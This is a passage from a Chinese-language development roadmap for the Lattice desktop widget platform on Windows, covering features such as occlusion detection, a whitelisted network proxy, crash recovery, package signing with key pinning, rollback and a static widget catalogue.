  - 写 CSS 时踩了一个自己的坑：格子写 `aspect-ratio: 1/1` 看着最自然，但 300 宽的卡片里 7 列 = 40px 一格，六行 240px，加上头部和下面那一天要 348px —— 输入框被挤出卡片外面。改成网格吃剩余高度（`grid-auto-rows: minmax(0, 1fr)`）+ 格子 16px 下限，默认尺寸也跟着从 300×300 提到 300×340。
- [x] **被别的窗口挡住也算看不见** —— 可见性以前只认"最小化 / 收起"两种状态，而这两种系统都会告诉窗口。**被挡住没有任何事件**：浏览器一最大化，桌面上每张卡的心跳照跑，系统监控每秒采一次 CPU 就一直采着，笔记本上这是实打实的电。现在 `occlusion.rs` 每 1.5 秒在窗口客户区取九个点问 `WindowFromPoint`，九个点全落在别人的窗口上才判"挡住"，交给同一条 `lattice:window-visible` 链路。
  - **为什么是轮询**：遮挡变化不产生窗口事件，只能自己看。1.5 秒一轮、每窗口九次命中测试（不碰渲染），代价可以忽略；而且 `visibility::sync` 只在状态变了才发事件，轮询本身不会吵到组件。
  - **点透窗口（`WS_EX_TRANSPARENT`）跳过这一套**：`WindowFromPoint` 本来就跳过点透窗口，拿它判永远是"被挡住"，那个组件会被永久停摆。误判成"不刷新"是看得见的坏，比少省的那点电严重。
  - **比对用 `IsChild` 而不是 `GetAncestor(GA_ROOT)`**：桌面层组件被 `SetParent` 挂到了 WorkerW 下面，那时它的 root 是 WorkerW 不是自己 —— 比 root 会把这一整类窗口判成挡住。
  - **`DWMWA_CLOAKED` 也算挡住**：虚拟桌面里那一半、被挂起的 UWP，`IsWindowVisible` 仍然是 true，屏幕上却没有。
  - **九个点全没命中才算**：露出一角就停，卡片会看着像冻住。采样点的取法和判定抽成 `occlusion_policy.rs`，8 条断言用 `rustc --test` 壳子跑（这台机器跑不了 `cargo test`）；Win32 那半只能真机看。
- [x] **✕ 要"按下和松开都落在按钮上"才认** —— 那条"组件自己从画布上消失"的幽灵点击至今没查到派发方：日志里是 `isTrusted: true`、`detail: 1`、`pointer: mouse`，落点正好是 22×22 的 ✕ 中心，和真点击一模一样。查不出派发方就只能把门收窄，把判断从宿主页抽成 `runtime/close-guard.ts` 的纯函数（`tests/close-guard.html` 22 条）。
  - **没有 `pointerdown` 的 `click` 一律不认**。这条最要紧：它堵死"凭空来一个 click 就删掉用户布局"。
  - **`elementFromPoint` 那条专门抓迟到输入**：点击发生之后窗口挪了位置、现在才被处理，那组坐标已经不在按钮上了 —— 这是目前唯一能解释"没人碰鼠标却有关闭"的机制，能不能抓到要看下次复现。
  - **键盘不能一起卡**：Enter / 空格的 `click` 没有指针序列（`detail === 0`），拿指针规则去卡它等于把键盘用户挡在门外。
  - **`why` 跟着 IPC 走**（`CloseOrigin::describe` 打进 `widget_close` 那行日志）。下次复现时 `ok` 说明那真是一段完整的按下 + 松开，`keyboard` 说明是键盘激活 —— 两者指向完全不同的方向。
  - **它没有解决根因**。如果幽灵点击本身就是一段完整的按下 / 松开，这套判断照样放行。这条留在"长期要盯的风险"里，别当成已结案。
- [x] **网络白名单代理** —— `network` 权限真正落地：组件**不直连**，请求走桥上的 `network.fetch`，由 Rust 侧（`network.rs`，WinHTTP）代发。组件文档的 `connect-src` 里只有它自己的协议源，所以浏览器层面根本没有第二条出网的路。
  - 为什么不做成"本地 HTTP 代理 + `connect-src` 指过去"：那样组件仍然能直接 `fetch`，白名单只剩一层自觉；而且本地代理要开一个端口，`connect-src` 就得放行它，那个地址本身又成了可以被直连的缝。IPC 代理没有端口。
  - 三道闸门：权限（`HostConfig.permissions`）→ 主机白名单（清单 `network.hosts`，精确匹配、可钉端口、**不支持通配符**）→ 形状（只 http/https、六种方法、请求体 ≤256KB、响应 ≤1MB 截断标记、头 ≤32 条、头里不许有换行）。
  - **重定向不跟随**（`WINHTTP_OPTION_REDIRECT_POLICY_NEVER`）：跟着 302 走等于白名单只检查了第一跳。3xx 原样回给组件，要跟就再调一次 —— 那时会重新过白名单。
  - 策略层（URL 解析 + 白名单）拆成 `network_policy.rs`，纯函数，`.scratch/net-test.rs` 用 `rustc --test` 跑 **9 条**断言；清单侧 `tests/manifest-network.html` **21 条**。
  - 真机验过（临时组件 + 本地 HTTP 服务）：白名单内的 `127.0.0.1:8787` 拿到 200 和 JSON；同端口换主机名（`localhost`）、换域名（`example.com`）、换协议（`file:`）三种全部被拒且理由各不相同；`302 → 127.0.0.1:8788`（不在白名单）**没有被跟随** —— 8788 那个"被击中就会记一行"的端点始终是 0 次
- [x] **开机自启** —— HKCU 的 `Run` 键，值名 `Lattice`，命令写成带引号的 `"<exe>"`（路径有空格时系统会把命令拆错）。注册表 API 直接调（`RegCreateKeyExW` / `RegSetQueryValueExW` / `RegDeleteValueW`），不引 `auto-launch` 那类库 —— 和 `metrics.rs` 手搓 Win32 采样同一条理由。
  - 设置菜单里一个开关，读的是**注册表真实状态**，写的返回值也是"写完之后的状态"（写失败时界面不许显示"已开启"）。注册的 exe 和当前跑的不是同一个构建时，下面挂一行提示"另一个构建"——开发态注册的是 `target\debug\lattice.exe`，用户重启后跑起来的却是安装版，这个差异必须说出来
  - **安装器不给默认开**：装完就多一条启动项是这个品类最招人烦的行为之一。`installer-hooks.nsh` 只做卸载清理（`DeleteRegValue`，不删键 —— `Run` 里还有别人的启动项）
  - "路径变了"交给应用自己对账：`autostart::reconcile()` 启动时看一眼，注册表里那条指向的不是当前 exe 就改写（**只改已经存在的**，不会因此把自启打开）。放应用里而不是安装器里，是因为应用知道自己的路径，不用去猜 NSIS 模板的 define，绿色版也一并覆盖。debug 构建直接跳过 —— 否则跑一次 `tauri dev` 就把用户的自启劫持到开发产物上
  - 真机验过：`autostart_get` → 开 → 注册表里确实出现 `"D://GitDev//lattice//src-tauri//target//debug//lattice.exe"`（带引号）→ 关 → 值消失
- [x] **托盘图标** —— 左键单击唤回主窗口，右键菜单三项：`Open Lattice` / `Pause all widgets` / `Quit`。暂停那一项的文字在 `Pause` 和 `Resume` 之间翻。托盘建失败只打一行日志，不拖垮启动（最坏情况回到"没有托盘"的旧行为）。
  - **暂停 = 把窗口藏起来**，不是只停动画：`hide()` 会让 `document.visibilityState` 变成 `hidden`，配合 `visibility.rs` 那条信号，调度器整条时间轴停摆 —— 是真的不占 CPU。恢复时先 `show()` 再重放层级（`show()` 会把窗口提到最前），并补一次 `visibility::sync()`（`hide/show` 不动尺寸、不触发 `Resized`）
  - 暂停状态**不落盘**：它是"现在别动"，不是配置。重启之后该恢复 —— 用户开机的期待是"组件在那儿"
  - 设置菜单里也有同一个开关（`set_widgets_paused`），托盘改了状态会发 `lattice:paused` 回主窗口，两边不会各说各话
  - 真机验过：托盘窗口存在（类名 `tray_icon_app`）、无创建失败日志、`set_widgets_paused(true/false)` 往返正确。**菜单项本身没点过** —— 它调的是 `toggle_paused` / `show_main` / `app.exit`，和上面验过的是同一段代码
- [x] **组件崩溃隔离与自动恢复** —— 只管**渲染进程整个挂掉**（`ICoreWebView2::add_ProcessFailed`）。JS 异常和资源 404 还是兜底页 + 错误卡那条路，没混进来重做。
  - 按 kind 分流：`RENDER_PROCESS_EXITED` / `FRAME_*` / `GPU_*` → 重载；`RENDER_PROCESS_UNRESPONSIVE` → **只记日志**（WebView2 自己会试，这时候重载可能把用户正在写的草稿弄丢）；`BROWSER_PROCESS_EXITED` → 窗口已经废了，上报不重载
  - 认不出来的 kind **不重载**。这条是踩出来的：第一版把不认识的也当"挂了"，`--in-process-gpu` 下每次导航都会看到辅助进程退出，重载又触发下一次事件，两个窗口几十秒里各重载一千多次
  - 重载不在 COM 回调里做（那等于让 WebView2 在自己的事件里拆自己）：换一条线程、等 120ms 再 `reload()`
  - 崩溃循环：60 秒内超过 3 次就停手，`lattice:widget-crashed` 带 `gaveUp: true` 上报；主窗口弹一条危险色提示条，带 `Try again`（`widget_reload`）。判定抽成 `crash_policy.rs` 的纯函数，`rustc --test` 跑得动
  - 真机验过（CDP `Page.crash` 直接打掉渲染进程）：第 1 次 → 日志 `attempt 1 — reloading`，宿主页自己回来了（iframe target id 变了，页面正常响应）；连打 4 次 → `attempt 1/2/3` 之后 `gave up`，主窗口出现 `Clock keeps crashing — its window stopped reloading.`，点 `Try again` 提示条消失、窗口回来。两次崩溃间隔超过 60 秒会重新计数（也验到了）
- [x] **组件目录的文件系统监听** —— `ReadDirectoryChangesW` 递归盯两个根：用户组件目录 + 开发机上的 `public/widgets`。每根一条采集线程，另有一条合并线程按"安静 300ms"去抖（`MAX_HOLD` 2 秒兜底），发 `lattice:widgets-changed`，载荷是**相对路径**。
  - 为什么不引 `notify`：要的只是"这棵树里有东西变了"，一个 API 就够；引一个跨平台 watcher 会带进来一整套依赖图，而这里只跑 Windows
  - 安装/卸载期间用 `watch::Suppress` 把事件压住：拷贝本身就是一次递归复制，而且装完之后主窗口自己会 `refresh()`
  - 宿主页按**前缀**筛（`<widgetId>/`）：协议层和 `install_widget` 都按 `<id>/<相对路径>` 拼，目录名等于清单 id。不筛的话，改一个组件五个卡片一起闪
  - 真机验过：往 `public/widgets/lattice.clock/` 里放一个文件 → 时钟宿主页的 iframe 带上 `__lattice_reload=<时间戳>`，便签宿主页的 `src` 原样；删掉再放一次同样生效；往**用户目录**里的组件写文件也触发了重载
- [x] **多屏边界夹紧** —— 几何抽成 `runtime/screen-fit.ts`（`pickScreen` / `fitAnchor`，纯函数），`tests/screen-fit.html` **19 条**断言钉住"锚点在里面就不动 / 出界时刚好挪到 margin / 跨屏按锚点选屏 / 极窄屏不甩飞"。
  - 全部改成**物理像素**算：`availableMonitors()`、`outerPosition()`、`innerSize()` 在 PerMonitorV2 下报的都是真实物理像素，跨屏连续，可以直接比；只有指针位移是 CSS px，乘一次当次的 `scaleFactor`。早先拿**当前窗口**的 scale 去折算**所有**显示器，是个统一线性变换，夹紧结果其实一样，但它把"别的屏的矩形"和"这块屏的缩放"混在一句话里，改一行就可能错 —— 现在这个歧义没有了
  - 真正的修正在拖动里：跨到另一块屏时缩放会变，Windows 会按 `WM_DPICHANGED` 的建议矩形把窗口重摆一遍，我们记的起点就此作废（症状是窗口从光标底下"滑走"）。所以每次 pump 都比一次 `scaleFactor()`，变了就重读 `outerPosition()` 并把当前指针位移当成新起点
  - 真机验过（**这台机器其实是双屏**：1728×1080 主屏 + `(-1728,1)` 的副屏，都是 96 DPI）：把时钟窗口 `set_position` 到 `x=-5000`，重载宿主页 → 开机自我校正把它拉回 `x=-1834`，锚点落在 `-1704 = -1728 + 24`，正好是副屏的左边界加 margin
  - **混合 DPI 仍然没验过**：两块屏都是 96 DPI，凑不出"一块 100% 一块 150%"的现场。跨屏重锚那段是按 `WM_DPICHANGED` 的语义推的，不是实测

## v0.4 —— 开发体验

- [x] **`@lattice/sdk`** —— 桥客户端、主题同步、类型定义封成一个**零依赖 ES module**（`packages/sdk/lattice.js` + `lattice.d.ts`），`tests/sdk.html` **34 条**断言钉住请求配对、超时、`permission_denied`、主题别名、存储、调度、媒体、网络透传。
  - **随包分发，不是 `npm install`**。平台的前提是"组件不用构建"，一旦 import 成了必需，每个组件都得配一套打包工具 —— 那是把复杂度转嫁给写组件的人。所以 `lattice.js` 是个普通文件，拷进组件目录就行
  - 代价是**副本会漂**。两道保险：`npm run sdk:sync` 刷所有内嵌副本，`npm run test:sdk`（`node --test`）在任何一个副本和源不一致时失败。第二道是真的会响 —— 改 SDK 忘了同步，CI 直接红
  - 启动顺序踩过一次：宿主只在收到 `ready` 之后才推主题和配置，而组件要等推送就得死等。所以 SDK 先**拉**一次（各自和 `bootTimeout` 赛跑），应用完再报 `ready`；宿主收到 ready 再推一遍，兜住"拉取之后、报 ready 之前配置刚被改"的那一瞬
  - 内置组件**一个都不用 SDK**（`scripts/sdk-sync.mjs` 只给已经存在 `lattice.js` 的目录补副本，`public/widgets/` 全部不在名单里）。它们就是"不装 SDK 也能写"的活证据，也是 SDK 的唯一回归基准
- [x] **`create-lattice-widget` 脚手架** —— `npm run create:widget -- demo.mine`，产出 `manifest.json` / `index.html` / `widget.js` / `style.css` / `icon.svg` / `README.md` 加两份 SDK 副本，`widget.js` 里已经接好 `schedule.every(1000)` 的心跳。
  - 参数：`--name` `--out` `--layer desktop|top` `--permissions a,b` `--interactive`
  - **id 不合规时给建议而不是报错**：`clock` 会被建议成 `demo.clock`（清单 id 至少要两段，见 `manifest.ts` 的 `ID_RE`）。新手第一个卡住的地方就是这个
  - 目标目录非空就拒绝 —— 脚手架覆盖用户的文件比不生成更糟
  - 生成的 `style.css` 顶上留 `padding: 34px 14px 14px`，把窗饰那 22px 让出来（见 WIDGET_SPEC §5.1）
- [x] **组件打包工具** —— 目录 → `.lattice`（zip）。`scripts/pack-widget.mjs` 手写 ZIP（local header + central directory + EOCD，`zlib.deflateRawSync`），Rust 侧 `package.rs` 读中央目录、`flate2` 解压、自己核 CRC。
  - **确定性**：条目按名字排序、DOS 时间戳固定成 1980-01-01、UTF-8 名（`flags = 0x0800`）。同样的输入两次打包字节完全一致 —— "你手上这个包是不是我发出去的那个"才是个能回答的问题，也是以后做签名校验的前提
  - **zip-slip 防了两道**：`package_policy::safe_relative_path` 拒 `..` / 绝对路径 / 盘符 / `\` / `:` / 空段，`join_inside` 在真正写盘那一处再验一次。上限：单文件 8MB、总量 64MB、500 个条目。任何一条不过就整包拒绝，不做"部分安装"
  - 装是**原子的**：先解到 `<id>.incoming`，成功了才删旧的、改名。解到一半失败不会留下半个组件
  - 交叉验过：Node 打出来的包用 Python 的 `zipfile.testzip()` 读得通（8 个条目、CRC 全对），同一个包再喂给 Rust 的 `extract()` 也过。Rust 侧的 10 条策略单测 + 5 条端到端（含篡改 CRC、路径穿越、绝对路径）用 `rustc --test` 跑
- [x] **媒体控制权限（SMTC）** —— `media.rs` 走 WinRT 的 `GlobalSystemMediaTransportControlsSessionManager`：读标题 / 歌手 / 专辑 / 播放器 / 状态 / 能力位 / 位置 / 时长，能发 `playPause` / `next` / `previous` / `stop`。桥上是 `media.get` + `media.control`，共用 `media:control` 一项权限（读和按是同一件事的两半，拆开只会让授权面板多一行看不懂的字）。
  - **COM 每次调用自己 `CoInitializeEx(COINIT_MULTITHREADED)`，返回值故意不看** —— 线程已经初始化过时它返回 `RPC_E_CHANGED_MODE`，那不算失败。不初始化就直接调是 `RPC_E_NOT_INITIALIZED`，这是 WinRT 最容易忘的一步
  - **没有会话时 `media.get` 返回 `null`，不是错误**。桌面上没开播放器是常态，组件该显示"没在放"而不是红字
  - `IAsyncOperation::join()` 阻塞等，**不加超时**：组件侧桥调用本来就有 3 秒超时，再套一层只会多一条要维护的失败路径
  - `TimeSpan` 是 100ns 单位，除 10000 才是毫秒 —— 忘了这一步，时长会显示成 10 小时的歌
  - 配了第一个真正用它 的内置组件 `public/widgets/lattice.media`（`tests/media.html` **33 条**断言）：轮询而非订阅（WinRT 事件要 COM 回调 + 活着的 STA 线程，代价远大于收益）、点按钮**本地先翻图标**再等系统确认、进度条按本地时间插值、时长 0 就不画进度条
  - 真机验过：桌面窗口里 `media.get` 每两秒一条、耗时 5–50ms、没有播放器时返回 null 且卡片显示 "Nothing playing"、三个按钮正确置灰
- [x] **组件调试面板** —— `Ctrl+Shift+D` 或顶栏的终端图标，从画布下沿升起一条 248px 的抽屉：桥调用的方法名 / 耗时 / 错误码、组件的每一条 `console.log/warn/error`，实时滚。
  - **两个 webview 的记录要汇合**。画布上的实例就在主窗口里，直接写总线；桌面窗口是另一个 webview，靠 `emit("lattice:debug")` 攒批发过来（400ms 或 50 条一次，逐条发等于把 IPC 流量翻倍）。主窗口在**启动时**就订阅，所以面板关着的时候也在收，打开就能看到之前的历史
  - **tracer 挂在每次调用的上下文里，不是模块级全局钩子**。第一版写成全局的，立刻发现错了：画布上同时挂着好几个实例，全局钩子只会剩下最后挂上去的那个，别的实例的调用全记到它头上
  - 组件的 console 由注入脚本转发（`__lattice` + `type: "log"`，限速 40 条/秒、正文截到 300 字）。**这条通道以前不存在** —— vite dev 不转发组件窗口的 console，所以"代码里写着日志，屏幕上什么都没有"是常态
  - 面板本身：All / Bridge / Console 三段、只看失败、按方法名 / 组件 id / 正文搜（大小写不敏感）、**Pause 冻住**（时钟每秒一条，想看清某行时它已经被顶走了）、Clear。环形缓冲 400 条
  - 过滤和统计抽成纯函数（`filterRecords` / `summarize`），`tests/debug.html` **43 条**断言覆盖总线与纯逻辑；`tests/debug-panel.html` **15 条**把真组件挂起来，验的是"接上 React 之后还对不对"（按钮点没接上 state、统计用了没过筛的那份，纯函数测试一条都抓不到）
  - 真机验过：面板里同时出现 `media.get`（桌面窗口镜像过来的）和 `clock.now`（画布实例 + 桌面实例各一份，所以每秒两条），耗时列 0.1–50ms

## v0.5 —— 分发

商店这件事的前提是"有人托管"。这个平台没有服务端，所以 v0.5 的答案是：
**目录是一份静态 JSON，包是签名过的文件，信任靠"第一次见到的那把钥匙"。**
四项都落在这个前提上，没有一项假装有后端。

- [x] **组件目录（商店）** —— 一份静态 `registry.json` + 一批签名过的 `.lattice` 包。内置目录跟着应用发（`public/store/`，由 `npm run store:index` 生成），也可以把整个目录扔到任何静态托管上，在设置里填地址换成远端的。
  - **校验是三道，顺序不能换**：`sha256(包字节)` 必须等于目录里写的那个 → `ed25519` 签名必须能被 `publisher.key` 验过 → 这把钥匙必须等于**这个组件第一次安装时钉在本地的钥匙**。前两道挡传输损坏和伪造，第三道才挡得住"我另起一把钥匙、连目录一起换掉"。
  - **目录本身不签名**。它只是一个索引；信任的锚点是包上的签名 + 本地钉住的钥匙。目录被改了，攻击者能做的只有"把某个条目指向别的包"—— 那会在第一道或第二道挂掉；或者"换一把钥匙"—— 那会在第三道挂掉，而且**界面上会明确写出两把钥匙的指纹**，要点一次确认才继续。
  - **第一次安装没有可钉的东西**（TOFU）。界面上把钥匙指纹印在卡片上，让人有机会对一眼；这不是 PKI，文档里也没假装它是。
  - 版本约束落在 `runtime/semver.ts`：`^` `~` `>=` `<=` `>` `<` `=`、部分版本（`1.2`）、通配（`1.x` / `*`）、`||`。**刻意不做**连字符区间和 npm 的预发布例外 —— 少一条隐式规则，就少一类"版本明明对得上却装不上"。
  - 纯逻辑（校验、选版本、安装计划）在 `runtime/catalogue.ts`，`tests/catalogue.html` **43 条**断言；版本比较 `tests/semver.html` **44 条**；接线（按钮接没接上回调、文案用的是不是过滤后的数据）由 `tests/store-ui.html` **17 条**兜着，它挂的是真的 `LibraryPanel`。
- [x] **组件更新与回滚** —— 覆盖式安装之前，旧目录整份复制到 `widget-backups/<id>`，只留一代。卡片上出现 `Back to <版本>`。
  - **回滚是交换，不是复制**：换回来之后，被换下去的那个版本变成新的备份，再点一次就回到更新后的版本。用复制实现的话第二次点还是回到同一个旧版本，用户会以为按钮坏了。
  - 卸载（`uninstall_widget`）连备份一起删 —— 那是用户明确说的"不要了"。
  - 目录安装、拖文件夹安装、`.lattice` 包安装**走同一条备份规则**：否则"拖一个文件夹进来"会成为唯一一种没法回滚的安装方式。
- [x] **评分与举报** —— 已安装的卡片上一排五颗星（点同一颗取消），`Report` 打开一个对话框：原因、说明、评分，保存成 `reports/<id>-<时间戳>.json`。
  - **没有服务端，所以没有"提交"**。对话框里写的是"文件存哪儿了，你自己发给作者"，而不是"已提交"——假装提交比不做更糟。
  - 举报里带版本、权限快照（在目录里）、平台与架构，作者拿到的是一份完整现场，不用让用户手抄版本号。
  - 评分是本地记录，随举报一起写进那份文件。
- [x] **权限变更提示** —— 更新之后比对"新版本申请的权限"和"本地已授予的"，多出来的**不自动授予**，并在底部弹一条**不会自己消失**的横幅：`Clock 1.1.0 asks for Network access. It stays denied until you allow it.` 两个按钮：`Allow`（逐项授予）/ `×`（保持拒绝）。
  - 卡片上同时出现 `Review` 标记，目录卡片里多要的那几项权限描一圈虚线。
  - 为什么不用弹窗挡住：组件在旧授权下仍然能用，硬拦等于"更新完就不能用了"；但也不能只在日志里说一句 —— 那等于没说。横幅 + 标记，直到用户处理过为止。

**验收结果**（2026-10-24 真机，探针跑真代码，不是"应该能"）：

| 项 | 实测 |
| --- | --- |
| 读目录 | 内置目录 6 个条目、0 条警告，地址 `http://127.0.0.1:1420/store/registry.json` |
| 首次安装 | `{ id: lattice.clock, version: 0.2.0, previousVersion: null, backedUp: false }` |
| 没备份时回滚 | `there is no previous version to roll back to`（明确报错，不是静默成功） |
| 覆盖安装 | `previousVersion: 0.2.0`、`backedUp: true`，`widget-backups/lattice.clock` 出现 |
| 回滚 | `{ version: 0.2.0, replaced: 0.2.0 }`，备份里换成了刚才那个版本（交换） |
| 摘要不对 | `package checksum mismatch (expected 000…, got 168e…) — the download is corrupt or was replaced` |
| 签名不对 | `package signature does not match the publisher key` |
| 换钥匙 | 同上（签名验不过，没有第二种解释） |
| 版本对不上 | `the package is version 0.2.0 but the catalogue lists 9.9.9` |
| 举报 | 写出 `reports/lattice.clock-<时间戳>.json` |

### v0.5 的四个取舍

这一版没有"被现实推翻"的决定 —— 四个都是先想清楚再写的，所以记在这里而不是上面那节。

1. **没有服务端，就别做需要服务端的形状**。目录是一份文件、举报是一个文件、评分是本地字段。真要接后端时，替换的是"目录从哪儿取"和"举报写到哪儿"，`parseCatalogue` / `planInstall` / 验签那一层一行都不用动。
2. **信任锚点是包，不是目录**。目录能被改，包上的签名不能伪造。代价是第一次安装只能信"这次看到的"（TOFU），所以界面必须把钥匙指纹露出来 —— 露出来不是为了好看，是为了让"换人"这件事有一次被看见的机会。
3. **备份只留一代，回滚做成交换**。"留几代"是个没有正确答案的配置项，而用户真正需要的是"回到刚才那个"。交换让按钮可以按两次，两个方向都成立。
4. **新权限不自动授予，但也不禁用组件**。自动授予等于把"更新"变成一次静默的提权；禁用组件等于让用户"更新完就不能用了"。所以是"照旧能用 + 一直提醒到处理为止"。

### 发一个版本的完整流程

```
1. 改组件（public/widgets/<id>/ 或自己的目录）
2. 改 manifest.json 的 version（语义化版本，必须三段）
3. npm run store:index        # 打包 + 签名 + 写 registry.json
4. 把 public/store/ 整个目录传上去（内置目录则跟着应用一起发）
```

发布者自己的密钥：`npm run sign:widget -- --gen-key --out publisher.key`，把公钥写进 `registry.json` 的 `publisher.key`。仓库里那把 `scripts/dev-publisher.key` 是**公开的**，只签官方自带的 6 个组件 —— 它证明的是"这个包和这份目录是一起发的"，不是"这个人可信"。

## v0.6 —— 生态（未开始）

v0.5 把"能分发"做完了，但分发的前提是**有人托管**。这件事现在不存在：目录只有内置那一份（6 个官方包，跟着应用发），设置里那个 `Custom URL` 框能填任意地址 —— 问题是填什么？填完之后能装到什么？公网上没有一份可填的目录。

所以 v0.6 只有一件事：**让目录真的存在于公网上，而且不止一份。**

这一节全部是**静态文件**，没有一项需要服务器 —— 这条约束和 v0.5 同源，不是顺手选的。目录是 JSON，包是签名文件，托管是 Pages，发布是 Actions。任何一项如果开始需要"后端"，说明方案选错了。

- [x] **公开目录源上线** —— 单独一个仓库（`registry.json` + `packages/*.lattice` + 一个 GitHub Actions），push 到 main 自动跑 `npm run store:index` 并把结果部署到 Pages。用户填 `https://<user>.github.io/lattice-registry/registry.json` 就能装。
  - **为什么单独一个仓库**：目录里的包天天变，平台代码不该跟着变；第三方作者提 PR 时改的是目录，不是平台。
  - **为什么是 Pages 而不是对象存储**：`registry.json` 要能被 `fetch`，Pages 天然带 HTTPS + CORS，一行配置都不用写。对象存储要么配 CORS 要么配自定义域，两样都是纯成本。
  - **代价**：Pages 有软限流（每 IP 每小时约 10 万次），个人目录远远够；但 `registry.json` 现在是每次启动全量 GET，包上限 16MB —— 量上来之后要靠下面那条增量。
  - **顺带验一次真机**：现在所有验签都是打本地 `127.0.0.1:1420` 的目录。跨域 + 真 HTTPS + 真 DNS 的组合没跑过，第一次上线必须拿真地址装一遍、更新一遍、回滚一遍。
  - **进度**：仓库已经推到 GitHub（`unraveltao/lattice-registry`），CI 全绿 —— 六个官方包 + sidecar + 图标 + `build.mjs` / `sign.mjs` / `serve.mjs` / Pages workflow 都在，`registry.json` 已生成并通过真实解析器与真实 HTTP 的端到端校验。**目录自己不再签一遍**：签名在 sidecar 里，由作者在自己机器上做，CI 只校验不签名（一旦 CI 能签，私钥就得进仓库）。官方包用的是新生成的发布者钥匙 `f842c1bf…`，**不是**仓库里那把公开的 `dev-publisher.key` —— 后者任何人都能用，拿它签公开发布的包等于没有签名。代价：已经用内置目录装过组件的机器，第一次切到这个源会看到一次"发布者钥匙变了"的确认。
  - **Pages 已经开了**（`https://unraveltao.github.io/lattice-registry/registry.json` 返回 200，六个包都能下载，`Access-Control-Allow-Origin: *`）。那个开关只能人点一次：`configure-pages` 的 `enablement: true` 试过两次都是 `Resource not accessible by integration` —— GITHUB_TOKEN 没有创建站点的权限。
- [ ] **多目录源（列表，不是单值）** —— `catalogueSource` 现在是 `{ kind, url }` 单值，切源等于"上一份目录整个消失"。真生态里一个人会同时订阅官方源和别人的源。改成 `sources: [{ id, url, enabled }]`：合并展示、按源分组、每个源单独显示"上次读到的时间 / 失败原因"。
  - **id 冲突不做"高版本胜"**：那等于谁都能覆盖别人的包。按源优先级取一份，另一份明确标成"Source B also has `demo.clock`"。同名不是安全问题（信任锚点是包上的钥匙），是显示问题。
  - 这条不做，"公开目录上线"就退化成"二选一"—— 用户填了第三方源就看不见官方更新，反过来也一样。
- [x] **目录的增量与缓存** —— 每次读目录都是全量 GET。加 `If-None-Match` / `If-Modified-Since`，304 就直接用内存里那份；网络失败时退回**上一次成功读到的那份**，并在界面上一行说明"Showing the catalogue from 3 hours ago"。断网等于商店空白，是现在最容易被误认为"应用坏了"的状态。
  - **做完了，四条边界记在这里**：缓存落在 `%APPDATA%\com.iron-tom.lattice\catalogue-cache\<sha256(url)[..16]>.json`，内容是 `{schema, url, at, etag, text}`，**地址对不上就整份作废**（用户把源从 A 改成 B，A 的旧内容不能顶 B）；解码任何一条不合法都当"没有缓存"，缓存是加速不是真相，读坏的后果应该是"照常走网络"而不是"界面上一堆怪报错"；ETag 只接受 128 字符以内、不带 `\r\n` 的值（它下一轮会被塞回请求头）；**304 那条其实省不下多少流量**（目录才几 KB），它的价值是"内容真的没变"这个证据，没有它每次启动都要重新解析一份没变的 JSON。
  - **默认源同时改了**：`catalogueSource` 默认从"内置演示目录"变成官方远端目录。内置那份用仓库里公开的 `dev-publisher.key` 签，和线上那把不是同一把钥匙 —— 让用户一上手就读线上，就不会在切源时连着吃六个"发布者钥匙变了"的确认。内置那份退成**断网兜底**：远端读不到且没有缓存时才顶上，界面上必须写明"这是随应用带的那份"（那份里的包是另一把钥匙签的，用户待会儿看到确认得有前因后果）。旧盘上的状态用 `persist` 的 `version: 1` + `migrateState` 迁过去，否则这个改动只对新装的机器生效。
- [ ] **作者发布流程写成文档** —— `docs/` 里有 WIDGET_SPEC（怎么写组件）和这份 ROADMAP（内部决策），**没有"我怎么把包发出去"这一页**。要写：`create:widget` → 改 manifest 版本 → `sign:widget --gen-key` → 向目录仓库提 PR（附公钥指纹）→ 合并后 Actions 自动打包签名发布。
  - 发布这件事本身已经收成一条命令：`npm run publish:widget -- <目录> --key <私钥>`（打包 → 签名 → 写 sidecar → 重建 `registry.json` → 告诉你提交哪三个文件）。**幂等是它的验收标准**：同一个目录连跑两次，目录仓库的 `git status` 必须是空的。剩下没做的是给人看的那一页，以及"第三方作者没有 Lattice 源码怎么发"那条路（走目录仓库自带的 `sign.mjs`）。
  - 同时定一条规则：**目录只收包，不收代码**。作者提交的是 `.lattice` + 公钥 + 一段说明，目录仓库不 clone 作者源码 —— 平台没有构建服务，也不该有。这条比它看起来重要：一旦目录开始"从源码构建"，就得为构建环境、依赖、可复现性负责，那是另一个项目。
- [ ] **首次引导** —— 组件库"可安装"那一段现在只有 6 个官方包，装完就空了。冷启动的死结在这儿：新用户打开，装完 6 个，发现"没有别的了"，然后关掉。给一条预置的官方源 + 一句"这里可以加别人的目录"，比多写 4 个官方包更值。
- [ ] **官方组件继续补** —— 和目录并行，但优先级**低于**"目录存在"。一个能装 30 个包的源，比 10 个更好的官方包更能说明这个平台是活的。
  - **第一批补完两个，而且是故意挑最难的两条轴**：`lattice.weather`（第一个真的联网的组件，`network` 权限 + 两个主机白名单 + 缓存 + 断网兜底，96 条断言）和 `lattice.focus`（第一个把时间当状态管的组件，绝对时刻 + 翻页 + 跨实例同步，56 条断言）。选这两个不是为了凑数：前六个内置组件把"展示 / 存储 / 系统指标 / 媒体会话"都覆盖了，唯独**出网**和**跨实例并发写**这两条一次没跑过。
  - **`lattice.weather` 立刻抓到两件事**。一是画布上的实例根本出不了网（`network_fetch` 靠窗口 label 查注册表，而画布上的实例不是窗口），见 v0.7 那条；二是"没授权 / 主机没列 / 城市查不到 / 连不上"在插件和接口层面几乎长得一样，不逐条分开的话用户只会看到"检查你的网络"。缓存键按「城市 + 单位」分开，是因为存储是 per-widgetId 的 —— 桌面上摆上海和东京两个实例，只存一个 `reading` 键就会互相覆盖。
  - **`lattice.focus` 的正确性全在"时间从哪儿来"**。平台在窗口不可见时停掉整条时间轴，所以"每秒减一"必然错 —— 存的是 `endsAt` 绝对时刻，剩余时间随时算。两个实例会在同一毫秒到点，而平台没有 CAS，于是翻页被写成**输入状态的纯函数**（`done` 是完成时刻数组而不是计数器，`[t, ...old]` 幂等），谁最后写都无所谓。`tests/focus.html` 里那条"两个实例同时到点只记一轮"就是钉这个的。
  - [x] **课程表（`lattice.timetable`，14 个官方组件）** —— 纯 `storage` 的周视图：五天 / 六天 / 七天、点空白加课、点课程块编辑、重叠并排、奇偶周、当前时间线；`tests/timetable.html` 144 条。
    - **默认 360×320，不是 240×140**：一周五天 × 十小时按每小时最少 22px 画，默认尺寸刚好不滚动；再小就滚动，而不是把字号压到读不清。最小 300×240。
